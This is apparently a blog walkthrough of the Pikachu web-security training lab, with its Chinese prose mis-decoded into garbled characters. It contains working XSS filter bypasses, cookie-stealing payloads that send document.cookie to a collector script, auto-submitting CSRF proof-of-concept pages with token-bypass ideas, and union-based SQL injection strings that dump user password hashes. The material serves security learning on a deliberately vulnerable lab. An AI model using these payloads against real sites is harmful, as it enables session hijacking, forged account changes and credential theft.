<p>æ€»ä½“æ€è·¯åˆ†ä¸‰ç±»ï¼ˆå½“ç„¶å¯ä»¥<strong>æŠ“åŒ…ä¿®æ”¹é‡æ”¾å—¯ç»•</strong>ï¼‰ï¼š</p>
<ul>
<li>è½¬æ¢<ul>
<li>å¤§å°å†™æ··æ‹¼ï¼Œå¦‚<code>&lt;ScRiPt&gt;</code></li>
<li>åŒæ‹¼ï¼Œå¦‚<code>&lt;scr&lt;script&gt;ipt&gt;</code></li>
<li>æ³¨é‡Šå¹²æ‰°ï¼Œå¦‚<code>&lt;scr&lt;!----&gt;ipt&gt;</code></li>
</ul>
</li>
<li>ç¼–ç <ul>
<li>è¦æ±‚è¾“å‡ºæ—¶æµè§ˆå™¨èƒ½å¯¹ç¼–ç è¿›è¡Œè¯†åˆ«ï¼Œå˜æˆæ­£å¸¸æ ‡ç­¾ä»è€Œæ‰§è¡Œ</li>
<li>å¦‚<code>alert(&#39;xss&#39;)</code>ä¸èƒ½URLç¼–ç ï¼š<br><code>alert%28%27xss%27%29</code><br>ä½†èƒ½HTMLç¼–ç ï¼š<br><code>&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;</code></li>
</ul>
</li>
<li>å…¶ä»–æ ‡ç­¾æˆ–å‡½æ•°<ul>
<li>æ¯”å¦‚æ¢æˆimgã€frameç­‰æ ‡ç­¾</li>
<li>æ¯”å¦‚æ¢æˆonloadç­‰å‡½æ•°è§¦å‘</li>
</ul>
</li>
</ul>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ç»¼åˆä½¿ç”¨ï¼Œæƒ³æ€ä¹ˆç»•æ€ä¹ˆç»•</p>
<h3 id="XSSä¹‹htmlspecialchars"><a href="#XSSä¹‹htmlspecialchars" class="headerlink" title="XSSä¹‹htmlspecialchars"></a>XSSä¹‹htmlspecialchars</h3><p>è¾“å…¥æ¡†ï¼ŒGETæäº¤åˆ°åŸé¡µé¢</p>
<p>è¾“å…¥â€œnmâ€ï¼Œæç¤ºè¾“å…¥å·²è¢«è®°å½•ï¼Œå¹¶ä¸”å‡ºç°è·³åˆ°â€œnmâ€çš„é“¾æ¥ï¼Œæœ‰å›æ˜¾<br>å°è¯•ä¸»åŠ¨é—­åˆæ¥Xï¼š<br><code>&#39; onclick=alert(123) &#39;</code><br>ç‚¹å‡»å°±Xåˆ°äº†</p>
<p>å†²æµªçœ‹çœ‹htmlspecialcharsçš„èµ„æ–™<br>ä¼šæŠŠâ€œ&amp;â€ã€â€œ&lt;â€ã€â€œ&gt;â€ã€â€œâ€â€è½¬ä¹‰æˆHTMLå®ä½“<br>é»˜è®¤æ˜¯ä¸è¿‡æ»¤å•å¼•å·çš„<br>è¿‡æ»¤å•å¼•å·éœ€è¦åŠ ä¸Šå‚æ•°<code>ENT_QUOTES</code></p>
<p>æœ€åé’“é±¼é“¾æ¥ï¼š<br><code>http://www.pikachu.com/vul/xss/xss_02.php?message=%27+onclick%3Ddocument.location%3D%27http%3A%2F%2Fwww.pikachu.com%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27%2Bdocument.cookie%3B+%27&amp;submit=submit</code></p>
<h3 id="XSSä¹‹hrefè¾“å‡º"><a href="#XSSä¹‹hrefè¾“å‡º" class="headerlink" title="XSSä¹‹hrefè¾“å‡º"></a>XSSä¹‹hrefè¾“å‡º</h3><p>è¿˜æ˜¯è¾“å…¥æ¡†ï¼ŒGETæäº¤åˆ°åŸé¡µé¢<br>è¾“å…¥<code>www.baidu.com</code>ï¼Ÿï¼Ÿï¼Ÿ<br>è¾“å…¥<code>www.pikachu.com</code>ï¼Œç”Ÿæˆäº†ä¸€ä¸ªaé“¾æ¥ï¼Œè¾“å…¥æ‹¼æ¥åˆ°äº†hrefå±æ€§å½“ä¸­</p>
<p>ç„¶åå‘ç°æ€ä¹ˆä¸»åŠ¨æ‹¼æ¥å’Œç»•è¿‡éƒ½ä¸å¥½ä½¿<br>çœ‹çœ¼æºç ï¼Œå‘ç°è¿™æ¬¡htmlspecialcharsä¹Ÿè¿‡æ»¤äº†å•å¼•å·</p>
<p>ç…çœ¼æç¤ºï¼š</p>
<blockquote>
<p>aæ ‡ç­¾é‡Œé¢çš„hrefï¼Œimgé‡Œé¢çš„srcå±æ€§,æœ‰ä»€ä¹ˆç‰¹æ®Šçš„ä¹ˆ</p>
</blockquote>
<p>åŸæ¥ä¸Šé¢çš„ä¸¤ä¸ªå±æ€§éƒ½å¯ä»¥ä½¿ç”¨javascriptä¼ªåè®®ï¼Œä»è€Œå¯ä»¥æ‰§è¡ŒJSè„šæœ¬</p>
<p>äºæ˜¯payloadï¼š<code>javascript:alert(123)</code><br>ç‚¹å‡»é“¾æ¥åå¼¹çª—</p>
<p>ç”±äºå•å¼•å·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯å‚è€ƒOWASPçš„å¤‡å¿˜å½•ï¼Œæ•´å‡ºæ¥è¿™ä¸ªpayloadï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="variable language_">document</span>.<span class="property">location</span>=<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">46</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">107</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">117</span>, <span class="number">46</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">112</span>, <span class="number">107</span>, <span class="number">120</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">47</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">46</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">63</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">61</span>)+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure>

<p>é’“é±¼é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="http://www.pikachu.com/vul/xss/xss_03.php?message=javascript:document.location=String.fromCharCode(104,+116,+116,+112,+58,+47,+47,+119,+119,+119,+46,+112,+105,+107,+97,+99,+104,+117,+46,+99,+111,+109,+47,+112,+107,+120,+115,+115,+47,+120,+99,+111,+111,+107,+105,+101,+47,+99,+111,+111,+107,+105,+101,+46,+112,+104,+112,+63,+99,+111,+111,+107,+105,+101,+61)+document.cookie;&submit=submit">http://www.pikachu.com/vul/xss/xss_03.php?message=javascript%3Adocument.location%3DString.fromCharCode%28104%2C+116%2C+116%2C+112%2C+58%2C+47%2C+47%2C+119%2C+119%2C+119%2C+46%2C+112%2C+105%2C+107%2C+97%2C+99%2C+104%2C+117%2C+46%2C+99%2C+111%2C+109%2C+47%2C+112%2C+107%2C+120%2C+115%2C+115%2C+47%2C+120%2C+99%2C+111%2C+111%2C+107%2C+105%2C+101%2C+47%2C+99%2C+111%2C+111%2C+107%2C+105%2C+101%2C+46%2C+112%2C+104%2C+112%2C+63%2C+99%2C+111%2C+111%2C+107%2C+105%2C+101%2C+61%29%2Bdocument.cookie%3B&amp;submit=submit</a></p>
<p>å‘ƒ</p>
<h3 id="XSSä¹‹JSè¾“å‡º"><a href="#XSSä¹‹JSè¾“å‡º" class="headerlink" title="XSSä¹‹JSè¾“å‡º"></a>XSSä¹‹JSè¾“å‡º</h3><p>è¾“å…¥æ¡†ï¼ŒGETæäº¤åˆ°åŸé¡µé¢<br>ç‰¹æ®Šä¹‹å¤„åœ¨äºè¾“å…¥æ˜¯å›æ˜¾åˆ°äº†ä¸€æ®µscriptæ ‡ç­¾ä¸­ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116115801204.png" alt="image-20211116115801204"></p>
<p>é‚£å°±ä¸»åŠ¨é—­åˆï¼Œå†æ‰“å…¥è‡ªå·±çš„è„šæœ¬æ ‡ç­¾ï¼š<br><code>&#39;;&lt;/script&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;/script&gt;</code><br>XSSæˆåŠŸï¼ŒHTMLå…ƒç´ å˜åŒ–ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116115948628.png" alt="image-20211116115948628"></p>
<p>å…¶ä»–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œscriptè„šæœ¬å†…éƒ¨ä¸ä¼šå¯¹å®ä½“ç¼–ç è¿›è¡Œè§£é‡Š<br>ä»¥åŠJSçš„è¾“å‡ºç‚¹åº”è¯¥ä½¿ç”¨â€˜\â€™å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰</p>
<h3 id="è¡¥å……ï¼šå…¶ä»–ä¸€äº›é’“é±¼payload"><a href="#è¡¥å……ï¼šå…¶ä»–ä¸€äº›é’“é±¼payload" class="headerlink" title="è¡¥å……ï¼šå…¶ä»–ä¸€äº›é’“é±¼payload"></a>è¡¥å……ï¼šå…¶ä»–ä¸€äº›é’“é±¼payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">document.write(&#x27;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#x27;+document.cookie+&#x27;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> /&gt;</span>&#x27;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>å…³é”®åœ¨äº<strong>å†™æ“ä½œ</strong></p>
<p>ä¸XSSçš„åŒºåˆ«ï¼š<br>CSRFï¼šå€Ÿæƒé™<br>XSSï¼šå·æƒé™</p>
<h3 id="CSRFï¼ˆGETï¼‰"><a href="#CSRFï¼ˆGETï¼‰" class="headerlink" title="CSRFï¼ˆGETï¼‰"></a>CSRFï¼ˆGETï¼‰</h3><p>å…ˆç™»å½•ï¼Œä¸€ä¸ªèƒ½æ”¹ä¿¡æ¯çš„é¡µé¢ï¼Œç„¶åå‘ç°æäº¤ä¿®æ”¹ä¿¡æ¯çš„æ“ä½œæ˜¯GETè¯·æ±‚<br>è€Œä¸”URLé‡Œæ²¡æœ‰tokenç­‰é‰´æƒå‚æ•°</p>
<p>é‚£ç›´æ¥æ„é€ é’“é±¼é“¾æ¥ç»™å—å®³è€…ç‚¹å³å¯ï¼š<br>ä¾‹å¦‚è¿›è¡Œä¸€ä¸ªæ€§çš„å˜ï¼š<br><code>http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php?sex=ä½ è·Œ&amp;phonenum=18656565545&amp;add=chinana&amp;email=lili%40pikachu.com&amp;submit=submit</code><br>æ¨¡æ‹Ÿå—å®³è€…ç‚¹å‡»ä¹‹åï¼Œæ€§åˆ«å˜æˆâ€œä½ è·Œâ€äº†</p>
<p>é€€å‡ºç™»å½•æ¸…é™¤ç™»å½•æ€ï¼Œç„¶åå°±ä¸èƒ½é’“é±¼ä¿®æ”¹é“¾æ¥äº†</p>
<hr>
<p>å¦å¤–æä¸€æ‰‹URLå‹ç¼©<br>æœ¬æ¥ç™¾åº¦æœ‰ä¸ªçŸ­ç½‘å€æœåŠ¡ï¼Œä½†æ˜¯ç°åœ¨å·²ç»ç¦æ­¢ä¸ªäººç”¨æˆ·åˆ›å»ºæ–°çš„çŸ­ç½‘å€äº†</p>
<h3 id="CSRFï¼ˆPOSTï¼‰"><a href="#CSRFï¼ˆPOSTï¼‰" class="headerlink" title="CSRFï¼ˆPOSTï¼‰"></a>CSRFï¼ˆPOSTï¼‰</h3><p>å’Œä¸Šé¢å·®ä¸å¤šï¼Œä½†æ˜¯å˜æˆPOSTæäº¤å‚æ•°ï¼Œé’“é±¼URLæ²¡ç”¨äº†<br>é‚£å°±é’“é±¼é¡µé¢ï¼ŒPOCï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>ä½ è·Œè·Œ<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;gogogo&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--æ³¨æ„è‡ªå·±æ·»åŠ actionï¼Œä»¥åŠæ£€æŸ¥enctypeå¯¹åº”MIME--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;go&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://www.pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;per_title&quot;</span>&gt;</span>hello,lucy,æ¬¢è¿æ¥åˆ°ä¸ªäººä¼šå‘˜ä¸­å¿ƒ | <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color:bule;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;csrf_post.php?logout=1&quot;</span>&gt;</span>é€€å‡ºç™»å½•<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_name&quot;</span>&gt;</span>å§“å:lucy<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_sex&quot;</span>&gt;</span>æ€§åˆ«:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æ€ä¹ˆè¢«æ”¹äº†&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_phone&quot;</span>&gt;</span>æ‰‹æœº:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;114514&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>    </span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_add&quot;</span>&gt;</span>ä½å€:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æš¨çŒª&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_email&quot;</span>&gt;</span>é‚®ç®±:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;lucy@pikachu.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;gogogo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;sub&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>TRICK!!!!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>
<ul>
<li>é’“é±¼é¡µé¢éœ€è¦æ”¾åœ¨å…¬ç½‘ï¼ˆå°±ä¸æ˜¯fileåè®®ä¹‹ç±»çš„ï¼‰</li>
<li>æ³¨æ„è‡ªå·±æ·»åŠ action</li>
<li>æ³¨æ„è¡¨å•çš„<strong>æäº¤ç±»å‹ï¼ˆenctypeï¼‰</strong>è¦å¯¹åº”ä¸Šï¼ˆæŠ“åŒ…çœ‹çœ‹ï¼‰</li>
</ul>
<h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>GETæäº¤è¯·æ±‚ï¼Œä½†æ˜¯å¤šäº†ä¸ªéšæœºç”Ÿæˆçš„tokenå­—æ®µ<br>äºæ˜¯è¦æ„é€ é’“é±¼URLçš„è¯å°±è¦æ”»å‡»è€…æ·»åŠ ä¸Šé‚£ä¸ªtoken</p>
<p>è¿™å°±æœ‰ç‚¹éš¾åŠäº†ã€‚ã€‚ã€‚ã€‚<br>ï¼ˆWeBankè¿˜è¯´å¾ˆå®¹æ˜“ç»•è¿‡æ¥ç€ï¼Ÿï¼Ÿï¼Ÿï¼Ÿæˆ‘å¤ªèœäº†ï¼‰</p>
<p>ä¸Šç½‘æŸ¥é˜…ï¼Œæœ‰ä¸¤ç§æ–¹å‘ï¼š</p>
<ul>
<li>ä¸€ç§æ˜¯å¸Œæœ›ç½‘ç«™å¼€å‘äººå‘˜çŠ¯è ¢</li>
<li>ä¸€ç§æ˜¯ç»“åˆå…¶ä»–æ¼æ´æ‰“</li>
</ul>
<hr>
<p>æ‰€è°“å¸Œæœ›å¼€å‘äººå‘˜çŠ¯è ¢ï¼Œæ— éå°±æ˜¯æœŸæœ›å¼€å‘è€…å¯¹tokençš„ä½¿ç”¨å’Œæ£€éªŒä¸å®Œæ•´<br>åå‘äºå…¬å¸å†…éƒ¨è¿›è¡Œå®‰å…¨æµ‹è¯•çš„æ€è·¯ï¼š</p>
<ul>
<li>ä¸åŒç”¨æˆ·tokenäº’é€š</li>
<li>æ›¿æ¢æˆç›¸åŒé•¿åº¦çš„å€¼</li>
<li>åˆ é™¤tokenå­—æ®µï¼ŒèµŒä»–æ£€æµ‹åˆ°æ²¡æœ‰å°±è·³è¿‡æ£€éªŒ</li>
<li>è¯†åˆ«&#x2F;æ¨æ–­tokenç®—æ³•</li>
<li>ä»…ä½¿ç”¨tokençš„é™æ€éƒ¨åˆ†<br>æ„æ€æ˜¯ï¼Œä¸€äº›tokenæ˜¯{å›ºå®šéƒ¨åˆ†+åŠ¨æ€éƒ¨åˆ†}æ¥ç»„æˆçš„<br>å¯ä»¥è¯•è¯•ä»…ç”¨å›ºå®šéƒ¨åˆ†æ¥æäº¤ï¼Œè¯´ä¸å®šèƒ½è¿‡</li>
</ul>
<p><del>ä¸å¦‚å»ä¸­å¥–</del></p>
<hr>
<p>ç»“åˆå…¶ä»–æ¼æ´æ‰“ï¼Œé¦–å…ˆæ˜¯æ¶‰åŠåˆ°ä¸€ä¸ªè·¨åŸŸçš„é—®é¢˜<br>æ¯”å¦‚æœ‰å¦‚ä¸‹POCï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;hack&quot;</span>).<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;transfer&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://ç½‘é¡µæœåŠ¡å™¨/dvwa/vulnerabilities/csrf&quot;</span> <span class="attr">id</span>=<span class="string">&quot;hack&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;attack()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span><span class="comment">&lt;!--è¡¨å•ä¸»ä½“--&gt;</span><span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¤§æ¦‚æ˜¯ï¼Œä½¿ç”¨JSï¼Œé€šè¿‡ä¸€ä¸ªçœ‹ä¸è§çš„æ¡†æ¶å·å·è·å–ç™»é™†é¡µé¢çš„token<br>ç„¶è€Œç”±äºåŒæºç­–ç•¥ï¼Œè¿™æ ·æ˜¯è¡Œä¸é€šçš„<br>æ‰€ä»¥ä¸€èˆ¬ç»“åˆè¯¸å¦‚XSSä¹‹ç±»çš„æ¼æ´ï¼Œæ¥ætoken</p>
<p>å¯„</p>
<h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><h3 id="æ¦‚è¿°-2"><a href="#æ¦‚è¿°-2" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>å•¥ä¹Ÿæ²¡è®²</p>
<p>æœ‰ä¸ªå°±æ˜¯é˜²å¾¡ç­–ç•¥ï¼šå˜é‡è¿‡æ»¤ã€å‚æ•°åŒ–</p>
<h3 id="æ•°å­—å‹æ³¨å…¥ï¼ˆPOSTï¼‰"><a href="#æ•°å­—å‹æ³¨å…¥ï¼ˆPOSTï¼‰" class="headerlink" title="æ•°å­—å‹æ³¨å…¥ï¼ˆPOSTï¼‰"></a>æ•°å­—å‹æ³¨å…¥ï¼ˆPOSTï¼‰</h3><p><code>99</code>ï¼šæ˜¾ç¤ºuseridä¸å­˜åœ¨</p>
<p><code>99 or 1=1</code>ï¼šå…¨æ³¨äº†å‡ºæ¥ï¼Œæ•°å­—å‹æ³¨å…¥</p>
<p><code>99 union select 1,2</code>ï¼šåˆ¤æ–­å‡ºæœ‰ä¸¤åˆ—</p>
<p><code>99 union select database(), user()</code>ï¼šçŸ¥é“æ•°æ®åº“åŠç”¨æˆ·</p>
<p><code>99 union select concat(table_name),2 from information_schema.tables where table_schema=database()</code>ï¼šçŸ¥é“æ‰€æœ‰è¡¨å</p>
<p><code>99 union select concat(column_name),2 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;</code>ï¼šçŸ¥é“usersè¡¨çš„æ‰€æœ‰åˆ—</p>
<p><code>99 union select concat(username),concat(password) from pikachu.users</code>ï¼šæåˆ°æ‰€æœ‰ç”¨æˆ·ååŠå¯¹åº”å¯†ç çš„å“ˆå¸Œ</p>
<hr>
<p>ä¸Šsqlmapï¼šä¹Ÿæ²¡å•¥å¥½è¯´çš„ï¼Œæ³¨çˆ†å•Š</p>
<p>ä½†æ˜¯è¿˜æ˜¯ä¸èƒ½å†™å…¥shell</p>
<h3 id="å­—ç¬¦å‹æ³¨å…¥ï¼ˆGETï¼‰"><a href="#å­—ç¬¦å‹æ³¨å…¥ï¼ˆGETï¼‰" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥ï¼ˆGETï¼‰"></a>å­—ç¬¦å‹æ³¨å…¥ï¼ˆGETï¼‰</h3><p><code>&#39;</code>ï¼šYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near â€˜â€™â€™â€™â€™ at line 1</p>
<p><del>ç„¶åå°è¯•BP repeateræ³¨å…¥ç»“æœè¢«å°çš®é˜²ç«å¢™æˆªäº†ï¼Œæä¸€æ</del><br>ç„¶åå‘ç°ä¸æ˜¯é˜²ç«å¢™çš„é—®é¢˜<br>æ˜¯URLç¼–ç çš„é—®é¢˜ï¼Œç¼–ç ä¹‹åå°±èƒ½å¤Ÿæ­£å¸¸æ³¨å…¥äº†<br>ï¼ˆå¥½æƒ³è¦æ­£ç‰ˆçš„BPä¸“ä¸šç‰ˆå•Šï¼‰</p>
<p><code>&#39; or &#39;1&#39;=&#39;1</code>ï¼šå…¨æ³¨å‡ºæ¥äº†</p>
<p><code>&#39; union select 1,2 %23</code>ï¼šåˆ¤æ–­å‡ºå›æ˜¾ä¸¤åˆ—</p>
<p>å‰©ä¸‹çš„å’Œä¸Šé¢å·®ä¸å¤š</p>
